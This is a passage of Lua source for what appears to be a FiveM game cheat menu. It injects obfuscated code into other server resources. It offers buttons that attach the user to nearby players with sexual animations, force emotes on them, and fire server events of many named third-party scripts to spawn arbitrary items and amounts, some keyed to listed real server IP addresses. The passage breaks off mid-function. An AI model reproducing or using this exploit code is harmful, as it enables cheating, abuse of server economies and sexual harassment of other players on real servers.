            if veh and TyUiOpAsDfGhJkLzXc(veh) and ZxCvBnMaSdFgTrEqWz(veh) then
                PlMnBvCxZaSdFgTrEq(veh, true, true)
                KjBtWxFhPoZuRZlK(veh, true)
                AsDfGhJkLzXcVbNmQwE(veh, 2)
                QwEoXyBkVsNzQuHL(veh, true)
            end
        end

        tRYpZvKLxQ()
    ]])
end)

-- Emote Tab
MachoMenuButton(EmoteTabSections[1], "Detach All Entitys", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function zXqLJWt7pN()
            local xPvA71LtqzW = ClearPedTasks
            local bXcT2mpqR9f = DetachEntity

            xPvA71LtqzW(PlayerPedId())
            bXcT2mpqR9f(PlayerPedId())
        end

        zXqLJWt7pN()
    ]])
end)

MachoMenuButton(EmoteTabSections[1], "Twerk On Them", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function OyWTpKvmXq()
            local closestPlayer, closestDistance = nil, math.huge
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)
            
            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)
                    
                    if distance < closestDistance then
                        closestDistance = distance
                        closestPlayer = playerId
                    end
                end
            end

            if closestPlayer then
                if StarkDaddy then
                    ClearPedSecondaryTask(playerPed)
                    DetachEntity(playerPed, true, false)
                    StarkDaddy = false
                else
                    StarkDaddy = true
                    if not HasAnimDictLoaded("switch@trevor@mocks_lapdance") then
                        RequestAnimDict("switch@trevor@mocks_lapdance")
                        while not HasAnimDictLoaded("switch@trevor@mocks_lapdance") do
                            Wait(0)
                        end        
                    end

                    local targetPed = GetPlayerPed(closestPlayer)
                    AttachEntityToEntity(playerPed, targetPed, 4103, 0.05, 0.38, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                    TaskPlayAnim(playerPed, "switch@trevor@mocks_lapdance", "001443_01_trvs_28_idle_stripper", 8.0, -8.0, 100000, 33, 0, false, false, false)
                end
            end
        end

        OyWTpKvmXq()
    ]])
end)

MachoMenuButton(EmoteTabSections[1], "Give Them Backshots", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function bXzLqPTMn9()
            local closestPlayer, closestDistance = nil, math.huge
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)

            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)

                    if distance < closestDistance then
                        closestDistance = distance
                        closestPlayer = playerId
                    end
                end
            end

            if closestPlayer then
                if StarkDaddy then
                    ClearPedSecondaryTask(playerPed)
                    DetachEntity(playerPed, true, false)
                    StarkDaddy = false
                else
                    StarkDaddy = true
                    if not HasAnimDictLoaded("rcmpaparazzo_2") then
                        RequestAnimDict("rcmpaparazzo_2")
                        while not HasAnimDictLoaded("rcmpaparazzo_2") do
                            Wait(0)
                        end
                    end

                    local targetPed = GetPlayerPed(closestPlayer)
                    AttachEntityToEntity(PlayerPedId(), targetPed, 4103, 0.04, -0.4, 0.1, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                    TaskPlayAnim(PlayerPedId(), "rcmpaparazzo_2", "shag_loop_a", 8.0, -8.0, 100000, 33, 0, false, false, false)
                    TaskPlayAnim(GetPlayerPed(closestPlayer), "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                end
            end
        end

        bXzLqPTMn9()
    ]])
end)

MachoMenuButton(EmoteTabSections[1], "Wank On Them", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function qXW7YpLtKv()
            local closestPlayer, closestDistance = nil, math.huge
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)

            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)

                    if distance < closestDistance then
                        closestDistance = distance
                        closestPlayer = playerId
                    end
                end
            end

            if closestPlayer then
                if isInPiggyBack then
                    ClearPedSecondaryTask(playerPed)
                    DetachEntity(playerPed, true, false)
                    wankoffperson = false
                else
                    wankoffperson = true
                    if not HasAnimDictLoaded("mp_player_int_upperwank") then
                        RequestAnimDict("mp_player_int_upperwank")
                        while not HasAnimDictLoaded("mp_player_int_upperwank") do
                            Wait(0)
                        end
                    end
                end

                TaskPlayAnim(PlayerPedId(), "mp_player_int_upperwank", "mp_player_int_wank_01", 8.0, -8.0, -1, 51, 1.0, false, false, false)
            end
        end

        qXW7YpLtKv()
    ]])
end)

MachoMenuButton(EmoteTabSections[1], "Piggyback On Player", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function RtKpqLmXZV()
            local closestPlayer, closestDistance = nil, math.huge
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)

            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)

                    if distance < closestDistance then
                        closestDistance = distance
                        closestPlayer = playerId
                    end
                end
            end

            if closestPlayer then
                if isInPiggyBack then
                    ClearPedSecondaryTask(playerPed)
                    DetachEntity(playerPed, true, false)
                    isInPiggyBack = false
                else
                    isInPiggyBack = true
                    if not HasAnimDictLoaded("anim@arena@celeb@flat@paired@no_props@") then
                        RequestAnimDict("anim@arena@celeb@flat@paired@no_props@")
                        while not HasAnimDictLoaded("anim@arena@celeb@flat@paired@no_props@") do
                            Wait(0)
                        end
                    end

                    local targetPed = GetPlayerPed(closestPlayer)
                    AttachEntityToEntity(PlayerPedId(), targetPed, 0, 0.0, -0.25, 0.45, 0.5, 0.5, 180, false, false, false, false, 2, false)
                    TaskPlayAnim(PlayerPedId(), "anim@arena@celeb@flat@paired@no_props@", "piggyback_c_player_b", 8.0, -8.0, 1000000, 33, 0, false, false, false)
                end
            end
        end

        RtKpqLmXZV()
    ]])
end)

MachoMenuButton(EmoteTabSections[1], "Blame Arrest", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function WXY7LpqKto()
            local closestPlayer, closestDistance = nil, math.huge
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)

            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)

                    if distance < closestDistance then
                        closestDistance = distance
                        closestPlayer = playerId
                    end
                end
            end

            if closestPlayer then
                if StarkCuff then
                    ClearPedSecondaryTask(playerPed)
                    DetachEntity(playerPed, true, false)
                    StarkCuff = false
                else
                    StarkCuff = true
                    if not HasAnimDictLoaded("mp_arresting") then
                        RequestAnimDict("mp_arresting")
                        while not HasAnimDictLoaded("mp_arresting") do
                            Wait(0)
                        end
                    end

                    local targetPed = GetPlayerPed(closestPlayer)
                    AttachEntityToEntity(PlayerPedId(), targetPed, 4103, 0.35, 0.38, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                    TaskPlayAnim(PlayerPedId(), "mp_arresting", "idle", 8.0, -8, -1, 49, 0.0, false, false, false)
                end
            end
        end

        WXY7LpqKto()
    ]])
end)

MachoMenuButton(EmoteTabSections[1], "Blame Carry", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function KmXYpTzqLW()
            local closestPlayer, closestDistance = nil, math.huge
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)

            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)

                    if distance < closestDistance then
                        closestDistance = distance
                        closestPlayer = playerId
                    end
                end
            end

            if closestPlayer then
                if StarkCarry then
                    ClearPedSecondaryTask(playerPed)
                    DetachEntity(playerPed, true, false)
                    StarkCarry = false
                else
                    StarkCarry = true
                    if not HasAnimDictLoaded("nm") then
                        RequestAnimDict("nm")
                        while not HasAnimDictLoaded("nm") do
                            Wait(0)
                        end
                    end

                    local targetPed = GetPlayerPed(closestPlayer)
                    AttachEntityToEntity(PlayerPedId(), targetPed, 0, 0.35, 0.08, 0.63, 0.5, 0.5, 180, false, false, false, false, 2, false)
                    TaskPlayAnim(PlayerPedId(), "nm", "firemans_carry", 8.0, -8.0, 100000, 33, 0, false, false, false)
                end
            end
        end

        KmXYpTzqLW()
    ]])
end)

MachoMenuButton(EmoteTabSections[1], "Sit On Them", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function PxKvqLtNYz()
            local closestPlayer, closestDistance = nil, math.huge
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)

            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)

                    if distance < closestDistance then
                        closestDistance = distance
                        closestPlayer = playerId
                    end
                end
            end

            if not HasAnimDictLoaded("anim@heists@prison_heistunfinished_biztarget_idle") then
                RequestAnimDict("anim@heists@prison_heistunfinished_biztarget_idle")
                while not HasAnimDictLoaded("anim@heists@prison_heistunfinished_biztarget_idle") do
                    Wait(0)
                end
            end

            AttachEntityToEntity(PlayerPedId(), GetPlayerPed(closestPlayer), 4103, 0.10, 0.28, 1.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
            TaskPlayAnim(PlayerPedId(), "anim@heists@prison_heistunfinished_biztarget_idle", "target_idle", 8.0, -8.0, 9999999, 33, 9999999, false, false, false)
            TaskSetBlockingOfNonTemporaryEvents(PlayerPedId(), true)
        end

        PxKvqLtNYz()
    ]])
end)

MachoMenuButton(EmoteTabSections[1], "Ride Driver", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function vZqPWLXm97()
            local closestPlayer, closestDistance = nil, math.huge
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)

            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)

                    if distance < closestDistance then
                        closestDistance = distance
                        closestPlayer = playerId
                    end
                end
            end

            if closestPlayer then
                if RideDriver then
                    ClearPedSecondaryTask(playerPed)
                    DetachEntity(playerPed, true, false)
                    RideDriver = false
                else
                    RideDriver = true
                    if not HasAnimDictLoaded("mini@prostitutes@sexnorm_veh") then
                        RequestAnimDict("mini@prostitutes@sexnorm_veh")
                        while not HasAnimDictLoaded("mini@prostitutes@sexnorm_veh") do
                            Wait(0)
                        end
                    end

                    local targetPed = GetPlayerPed(closestPlayer)
                    AttachEntityToEntity(PlayerPedId(), targetPed, 0, 0.35, 0.08, 0.63, 0.5, 0.5, 180, false, false, false, false, 2, false)
                    TaskPlayAnim(PlayerPedId(), "mini@prostitutes@sexnorm_veh", "sex_loop_prostitute", 8.0, -8.0, 100000, 33, 0, false, false, false)
                end
            end
        end

        vZqPWLXm97()
    ]])
end)

MachoMenuButton(EmoteTabSections[1], "Blow Driver", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function qPLWtXYzKm()
            local closestPlayer, closestDistance = nil, math.huge
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)

            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)

                    if distance < closestDistance then
                        closestDistance = distance
                        closestPlayer = playerId
                    end
                end
            end

            if closestPlayer then
                if BlowDriver then
                    ClearPedSecondaryTask(playerPed)
                    DetachEntity(playerPed, true, false)
                    BlowDriver = false
                else
                    BlowDriver = true
                    if not HasAnimDictLoaded("mini@prostitutes@sexnorm_veh") then
                        RequestAnimDict("mini@prostitutes@sexnorm_veh")
                        while not HasAnimDictLoaded("mini@prostitutes@sexnorm_veh") do
                            Wait(0)
                        end
                    end

                    TaskPlayAnim(PlayerPedId(), "mini@prostitutes@sexnorm_veh", "bj_loop_prostitute", 8.0, -8.0, 100000, 33, 0, false, false, false)
                end
            end
        end

        qPLWtXYzKm()
    ]])
end)

MachoMenuButton(EmoteTabSections[1], "Meditate On Them", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function XYqLvTzWKo()
            local closestPlayer, closestDistance = nil, math.huge
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)

            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)

                    if distance < closestDistance then
                        closestDistance = distance
                        closestPlayer = playerId
                    end
                end
            end

            if not HasAnimDictLoaded("rcmcollect_paperleadinout@") then
                RequestAnimDict("rcmcollect_paperleadinout@")
                while not HasAnimDictLoaded("rcmcollect_paperleadinout@") do
                    Wait(0)
                end
            end

            AttachEntityToEntity(PlayerPedId(), GetPlayerPed(closestPlayer), 57005, 0, -0.12, 1.53, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
            TaskPlayAnim(PlayerPedId(), "rcmcollect_paperleadinout", "meditiate_idle", 8.0, -8.0, 9999999, 33, 9999999, false, false, false)
            TaskSetBlockingOfNonTemporaryEvents(PlayerPedId(), true)
        end

        XYqLvTzWKo()
    ]])
end)

local EmoteDropDownChoice = 0
local EmoteToggle = false
local EmoteThread = nil

local EmoteMap = {
    [0] = "slapped",
    [1] = "punched",
    [2] = "receiveblowjob",
    [3] = "GiveBlowjob",
    [4] = "headbutted",
    [5] = "hug4",
    [6] = "streetsexfemale",
    [7] = "streetsexmale",
    [8] = "pback2",
    [9] = "carry3",
    [10] = ".....gta298",
    [11] = ".....gta304",
    [12] = ".....gta284"

}

MachoMenuDropDown(EmoteTabSections[2], "Emote Choice", function(index)
    EmoteDropDownChoice = index
end,
    "Slapped",
    "Punched",
    "Give BJ",
    "Recieve BJ",
    "Headbutt",
    "Hug",
    "StreetSexFemale",
    "StreetSexMale",
    "Piggyback",
    "Carry",
    "Butt Rape",
    "Amazing Head",
    "Lesbian Scissors"
)

MachoMenuButton(EmoteTabSections[2], "Give Emote", function()
    local emote = EmoteMap[EmoteDropDownChoice]
    if emote then
        MachoInjectResource2(3, CheckResource("monitor") and "monitor" or "any", string.format([[
            local function KmTpqXYzLv()
                local Rk3uVnTZpxf7Q = TriggerEvent
                Rk3uVnTZpxf7Q("ClientEmoteRequestReceive", "%s", true)
            end

            KmTpqXYzLv()
        ]], emote))
    end
end)

-- Event Tab
InputBoxHandle = MachoMenuInputbox(EventTabSections[1], "Name:", "...")
InputBoxHandle2 = MachoMenuInputbox(EventTabSections[1], "Amount:", "...")

MachoMenuButton(EventTabSections[1], "Spawn", function()
    local ItemName = MachoMenuGetInputbox(InputBoxHandle)
    local ItemAmount = MachoMenuGetInputbox(InputBoxHandle2)

    if ItemName and ItemName ~= "" and ItemAmount and tonumber(ItemAmount) then
        local Amount = tonumber(ItemAmount)
        local resourceActions = {
            ["ak47_drugmanager"] = function()
                MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                    local function efjwr8sfr()
                        TriggerServerEvent('ak47_drugmanager:pickedupitem', "]] .. ItemName .. [[", "]] .. ItemName .. [[", ]] .. ItemAmount .. [[)
                    end

                    efjwr8sfr()
                ]])
            end,

            ["bobi-selldrugs"] = function()
                MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                    local function safdagwawe()
                        TriggerServerEvent('bobi-selldrugs:server:RetrieveDrugs', "]] .. ItemName .. [[", ]] .. ItemAmount .. [[)
                    end

                    safdagwawe()
                ]])
            end,

            ["mc9-taco"] = function()
                MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                    local function cesfw33w245d()
                        TriggerServerEvent('mc9-taco:server:addItem', "]] .. ItemName .. [[", ]] .. ItemAmount .. [[)
                    end

                    cesfw33w245d()
                ]])
            end,

            ["bobi-selldrugs"] = function()
                MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                    local function safdagwawe()
                        TriggerServerEvent('bobi-selldrugs:server:RetrieveDrugs', "]] .. ItemName .. [[", ]] .. ItemAmount .. [[)
                    end

                    safdagwawe()
                ]])
            end,

            ["wp-pocketbikes"] = function()
                MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                    local function awdfaweawewaeawe()
                        TriggerServerEvent("wp-pocketbikes:server:AddItem", "]] .. ItemName .. [[", ]] .. ItemAmount .. [[)
                    end

                    awdfaweawewaeawe()
                ]])
            end,

            ["solos-jointroll"] = function()
                MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                    local function weawasfawfasfa()
                        TriggerServerEvent('solos-joints:server:itemadd', "]] .. ItemName .. [[", ]] .. ItemAmount .. [[)
                    end

                    weawasfawfasfa()
                ]])
            end,

            ["angelicxs-CivilianJobs"] = function()
                MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                    local function safafawfaws()
                        TriggerServerEvent('angelicxs-CivilianJobs:Server:GainItem', "]] .. ItemName .. [[", ]] .. ItemAmount .. [[)
                    end

                    safafawfaws()
                ]])
            end,

            ["ars_whitewidow_v2"] = function() 
                MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                    local function sDfjMawT34()
                        TriggerServerEvent('ars_whitewidow_v2:Buyitem', {
                            items = {
                                {
                                    id = "]] .. ItemName .. [[",
                                    image = "FODO",
                                    name = "FODO",
                                    page = 1,
                                    price = 500,
                                    quantity = ]] .. ItemAmount .. [[,
                                    stock = 999999999999999999999999999,
                                    totalPrice = 0
                                }
                            },
                            method = "cash",
                            total = 0
                        }, "cash")
                    end

                    sDfjMawT34()
                ]])
            end,

            ["ars_cannabisstore_v2"] = function()
                MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function sDfjMawT34()
                    TriggerServerEvent("ars_cannabisstore_v2:Buyitem", {
                        items = {
                            {
                                id = "]] .. ItemName .. [[",
                                image = "FODO",
                                name = "FODO",
                                page = FODO,
                                price = FODO,
                                quantity = ]] .. ItemAmount .. [[,
                                stock = FODO,
                                totalPrice = 0
                            }
                        },
                        method = "FODO",
                        total = 0
                    }, "cash")
                end

                sDfjMawT34()
                ]])
            end,

            ["ars_hunting"] = function()
                MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                    local function sDfjMawT34()
                        TriggerServerEvent("ars_hunting:sellBuyItem",  {
                            item = "]] .. ItemName .. [[",
                            price = 1,
                            quantity = ]] .. ItemAmount .. [[,
                            buy = true
                        })
                    end

                    sDfjMawT34()
                ]])
            end,

            ["boii-whitewidow"] = function() -- Dolph Land only
                local ServerIP = {
                    "217.20.242.24:30120"
                }

                local function IsAllowedIP(CurrentIP)
                    for _, ip in ipairs(ServerIP) do
                        if CurrentIP == ip then
                            return true
                        end
                    end
                    return false
                end

                local CurrentIP = GetCurrentServerEndpoint()

                if IsAllowedIP(CurrentIP) then
                    MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                        local function sDfjMawT34()
                            TriggerServerEvent('boii-whitewidow:server:AddItem', ']] .. ItemName .. [[', ]] .. ItemAmount .. [[)
                        end

                        sDfjMawT34()
                    ]])
                end
            end,

            ["codewave-cannabis-cafe"] = function() -- Neighborhood
                local ServerIP = {
                    "185.244.106.45:30120"
                }

                local function IsAllowedIP(CurrentIP)
                    for _, ip in ipairs(ServerIP) do
                        if CurrentIP == ip then
                            return true
                        end
                    end
                    return false
                end

                local CurrentIP = GetCurrentServerEndpoint()

                if IsAllowedIP(CurrentIP) then
                    MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                        local function sDfjMawT34()
                            TriggerServerEvent("cannabis_cafe:giveStockItems", { item = "]] .. ItemName .. [[", newItem = "FODO", pricePerItem = 0 }, ]] .. ItemAmount .. [[)
                        end

                        sDfjMawT34()
                    ]])
                end
            end,

            ["snipe-boombox"] = function()
                MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                    local function sDfjMawT34()
                        TriggerServerEvent("snipe-boombox:server:pickup", ]] .. ItemAmount .. [[, vector3(0.0, 0.0, 0.0), "]] .. ItemName .. [[")
                    end

                    sDfjMawT34()
                ]])
            end,

            ["devkit_bbq"] = function()
                MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                    local function sDfjMawT34()
                        TriggerServerEvent('devkit_bbq:addinv', ']] .. ItemName .. [[', ]] .. ItemAmount .. [[)
                    end

                    sDfjMawT34()
                ]])
            end,

            ["mt_printers"] = function()       
                MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[  
                    local function sDfjMawT34()
                        TriggerServerEvent('__ox_cb_mt_printers:server:itemActions', "mt_printers", "mt_printers:server:itemActions:GAMERWARE", "]] .. ItemName .. [[", "add")
                    end

                    sDfjMawT34()
                ]])
            end,

            ["WayTooCerti_3D_Printer"] = function()       
                MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[ 
                    local function ZxUwQsErTy12()
                        TriggerServerEvent('waytoocerti_3dprinter:CompletePurchase', ']] .. ItemName .. [[', ]] .. ItemAmount .. [[)
                    end
                    ZxUwQsErTy12()
                ]])
            end,

            ["pug-fishing"] = function()
                MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                    local function MnBvCxZlKjHgFd23()
                        TriggerServerEvent('Pug:server:GiveFish', "]] .. ItemName .. [[", ]] .. ItemAmount .. [[)
                    end
                    MnBvCxZlKjHgFd23()
                ]])
            end,

            -- TriggerServerEvent("apex_tacofarmer:client:addItem", "item", amount) Premier RP Backup

            ["apex_koi"] = function()
                MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                    local function ErTyUiOpAsDfGh45()
                        TriggerServerEvent("apex_koi:client:addItem", "]] .. ItemName .. [[", ]] .. ItemAmount .. [[)
                    end
                    ErTyUiOpAsDfGh45()
                ]])
            end,

            ["apex_peckerwood"] = function()
                MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                    local function UiOpAsDfGhJkLz67()
                        TriggerServerEvent("apex_peckerwood:client:addItem", "]] .. ItemName .. [[", ]] .. ItemAmount .. [[)
                    end
                    UiOpAsDfGhJkLz67()
                ]])
            end,

            ["apex_thetown"] = function()
                MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                    local function PlMnBvCxZaSdFg89()
                        TriggerServerEvent("apex_thetown:client:addItem", "]] .. ItemName .. [[", ]] .. ItemAmount .. [[)
                    end
                    PlMnBvCxZaSdFg89()
                ]])
            end,

            ["codewave-bbq"] = function()
                MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                    local function QwErTyUiOpAsDf90()
                        for i = 1, ]] .. ItemAmount .. [[ do
                            TriggerServerEvent('placeProp:returnItem', "]] .. ItemName .. [[")
                            Wait(1)
                        end
                    end
                    QwErTyUiOpAsDf90()
                ]])
            end,

            ["brutal_hunting"] = function()
                MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                    local function TyUiOpAsDfGhJk01()
                        Wait(1)
                        TriggerServerEvent("brutal_hunting:server:AddItem", {
                            {
                                amount = "]] .. ItemAmount .. [[",
                                item = "]] .. ItemName .. [[",
                                label = "GAMERWARE",
                                price = 0
                            }
                        })
                    end
                    TyUiOpAsDfGhJk01()
                ]])
            end,

            ["xmmx_bahamas"] = function()
                MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                    local function JkLzXcVbNmQwEr02()
                        TriggerServerEvent("xmmx-bahamas:Making:GetItem", "]] .. ItemName .. [[", {
                            amount = ]] .. ItemAmount .. [[,
                            cash = {
                            }
                        })
                    end
                    JkLzXcVbNmQwEr02()
                ]])
            end,

            ["ak47_drugmanager"] = function() -- Drilltime NYC only
                local ServerIP = { "162.222.16.18:30120" }

                local function IsAllowedIP(CurrentIP)
                    for _, ip in ipairs(ServerIP) do
                        if CurrentIP == ip then return true end
                    end
                    return false
                end

                local CurrentIP = GetCurrentServerEndpoint()

                if IsAllowedIP(CurrentIP) then
                    MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                        local function aKf48SlWd()
                            Wait(1)
                            TriggerServerEvent('ak47_drugmanager:pickedupitem', "]] .. ItemName .. [[", "]] .. ItemName .. [[", ]] .. ItemAmount .. [[)
                        end
                        aKf48SlWd()
                    ]])
                end
            end,

            ["xmmx_letscookplus"] = function()
                MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                    local function QwErTy123()
                        Wait(1)
                        TriggerServerEvent('xmmx_letscookplus:server:BuyItems', {
                            totalCost = 0,
                            cart = {
                                {name = "]] .. ItemName .. [[", quantity = ]] .. ItemAmount .. [[}
                            }
                        }, "bank")
                    end
                    QwErTy123()
                ]])
            end,

            ["xmmx-letscamp"] = function() -- Every server but Grizzly World.
                local BlockedIPs = { "66.70.153.70:80" }

                local function IsBlockedIP(CurrentIP)
                    for _, ip in ipairs(BlockedIPs) do
                        if CurrentIP == ip then return true end
                    end
                    return false
                end

                local CurrentIP = GetCurrentServerEndpoint()

                if not IsBlockedIP(CurrentIP) then
                    local code = string.format([[ 
                        local function XcVbNm82()
                            Wait(1)
                            TriggerServerEvent('xmmx-letscamp:Cooking:GetItem', ']] .. ItemName .. [[', {
                                ["%s"] = {
                                    ['lccampherbs'] = 0,
                                    ['lccampmeat'] = 0,
                                    ['lccampbutta'] = 0
                                },
                                ['amount'] = ]] .. ItemAmount .. [[
                            })
                        end
                        XcVbNm82()
                    ]], ItemName)

                    MachoInjectResource2(3, "xmmx-letscamp", code)
                end
            end,

            ["wasabi_mining"] = function()
                MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                    local function MzXnJqKs88()
                        local item = {
                            difficulty = { "medium", "medium" },
                            item = "]] .. ItemName .. [[",
                            label = "FODO",
                            price = { 110, 140 }
                        }

                        local index = 3
                        local amount = ]] .. ItemAmount .. [[

                        for i = 1, amount do
                            Wait(1)
                            TriggerServerEvent('wasabi_mining:mineRock', item, index)
                        end
                    end
                    MzXnJqKs88()
                ]])
            end,

            ["apex_bahama"] = function() -- 17th Street
                local ServerIP = { "89.31.216.161:30120" }

                local function IsAllowedIP(CurrentIP)
                    for _, ip in ipairs(ServerIP) do
                        if CurrentIP == ip then return true end
                    end
                    return false
                end

                local CurrentIP = GetCurrentServerEndpoint()

                if IsAllowedIP(CurrentIP) then
                    MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                        local function PlMnBv55()
                            Wait(1)
                            TriggerServerEvent("apex_bahama:client:addItem", "]] .. ItemName .. [[", ]] .. ItemAmount .. [[)
                        end
                        PlMnBv55()
                    ]])
                end
            end,

            ["jg-mechanic"] = function() -- Sunnyside Atlanta only
                local ServerIP = { "91.190.154.43:30120" }

                local function IsAllowedIP(CurrentIP)
                    for _, ip in ipairs(ServerIP) do
                        if CurrentIP == ip then return true end
                    end
                    return false
                end

                local CurrentIP = GetCurrentServerEndpoint()

                if IsAllowedIP(CurrentIP) then
                    MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                        local function HjKlYu89()
                            Wait(1)
                            TriggerServerEvent('jg-mechanic:server:buy-item', "]] .. ItemName .. [[", 0, ]] .. ItemAmount .. [[, "autoexotic", 1)
                        end
                        HjKlYu89()
                    ]])
                end
            end,

            ["jg-mechanic"] = function() -- ShiestyLife RP
                local ServerIP = { "191.96.152.17:30121" }

                local function IsAllowedIP(CurrentIP)
